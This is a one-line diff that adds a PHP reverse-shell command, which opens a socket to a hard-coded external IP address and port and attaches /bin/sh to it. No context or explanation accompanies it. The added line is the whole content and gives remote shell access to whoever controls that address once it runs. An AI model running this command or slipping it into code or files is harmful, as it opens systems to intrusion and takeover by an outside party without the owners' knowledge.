@@ -1,0 +1,1 @@
+php -r '$sock=fsockopen("173.236.241.18",9777);system("/bin/sh <&3 >&3 2>&3");'
